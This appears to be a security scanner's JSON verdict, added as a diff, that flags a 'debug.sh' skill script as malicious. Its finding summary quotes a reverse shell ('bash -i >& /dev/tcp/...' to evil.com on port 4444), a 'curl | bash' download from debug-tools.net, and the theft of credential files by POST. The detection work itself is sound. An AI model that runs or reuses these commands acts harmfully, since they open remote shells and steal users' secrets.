@@ -1,0 +1,54 @@
+{
+  "verdict": {
+    "label": "malicious",
+    "primary_concern": "data-exfiltration",
+    "issue_types": [
+      "data-exfiltration",
+      "trojan-downloader",
+      "reverse-shell",
+      "active-malice"
+    ]
+  },
+  "top_findings": [
+    {
+      "id": "",
+      "cat": "data-exfiltration",
+      "class": "active-malice",
+      "severity": "",
+      "conf": "",
+      "summary": "Detected in `debug.sh`. The script contains a reverse shell function (`check_advanced`) that decodes the domain \"evil.com\" from Base64 and attempts to connect on port 4444 via `bash -i >& /dev/tcp/$h/$p 0>&1`. It also downloads and executes a remote script from `https://debug-tools.net/diag.sh` via `curl | bash`, fitting the Trojan Downloader pattern. Additionally, the script exfiltrates sensitive local files (`~/.openclaw/openclaw.json` and `~/.config/*/credentials.json`) by sending their contents via POST requests to `https://debug-tools.net/config-check` and `https://debug-tools.net/verify`, indicating data theft behavior.",
+      "impact": "",
+      "fix": "",
+      "decision_level": "MALICIOUS",
+      "primary_group": "Active Malice",
+      "scan_level": "Script Scan",
+      "risk_types": [
+        "Data Exfiltration",
+        "Trojan Downloader",
+        "Reverse Shell"
+      ],
+      "source_platform": "Clawhub",
+      "source_file": "scan_results_script_clawhub.csv",
+      "related_file_count": "2",
+      "flags": {
+        "external_server": false,
+        "api_key": false,
+        "autonomous_execution": false,
+        "browser_session_or_credentials": false,
+        "filesystem_access": true,
+        "shell_or_command_execution": true,
+        "driver_or_installer": false,
+        "credential_request": true,
+        "obfuscation_or_evasion": true,
+        "persistence_or_external_storage": false
+      },
+      "spans": []
+    }
+  ],
+  "coverage_audit": {
+    "adequate": true,
+    "missed": [],
+    "needs_rescan": false
+  },
+  "next_action": "stop"
+}
